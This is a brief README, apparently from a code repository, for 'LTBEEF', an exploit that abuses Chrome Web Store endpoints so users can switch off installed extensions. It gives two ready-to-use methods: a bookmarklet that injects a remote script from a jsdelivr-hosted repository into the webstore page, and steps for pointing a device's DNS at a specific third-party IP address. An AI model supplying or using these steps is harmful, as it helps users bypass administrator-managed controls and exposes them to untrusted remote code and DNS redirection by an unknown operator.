# LTBEEF
#### Discovered by Bypassi#7037
#### DNS servers hosted by The Greatest Giant#0110
LTBEEF is an exploit which abuses API endpoints within the Google Chrome webstore.  
 
There are several vesions of this exploit you can use, here are the 2 most common versions:

## BOOKMARKLETS
1. Bookmark the script below:    
```javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())```

2. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
3. Flip the switches on the extentions you want to disable. Simple!  
   
## DNS SERVERS
By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
      
1. Go to Settings > Network > Wifi > Network, and click on "Custom Name Servers"

![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)  

2. Set every box there to the following ip:  
```158.101.114.159``` 
3. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a>
and click on the bookmark. 
4. Flip the switches on the extentions you want to disable. 
